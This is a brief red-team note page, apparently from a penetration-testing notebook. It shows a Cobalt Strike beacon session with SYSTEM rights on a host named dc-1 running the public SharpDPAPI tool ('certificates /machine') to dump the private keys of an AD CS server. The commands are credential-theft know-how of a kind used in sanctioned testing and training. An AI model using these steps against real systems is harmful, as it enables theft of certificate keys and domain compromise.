# SharpDPAPI

## [[Data Protection API (DPAPI)]]
Dump private keys but requires [[SharpDPAPI#Dump private keys]]
```beacon
beacon> run hostname
dc-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine
```
 ![](/Images/Pasted%20image%2020220322003615.png)



```meta
requirements: 
results: 
oss: #win 
source: https://github.com/GhostPack/SharpDPAPI
description: Dump the private key from a AD CS server
```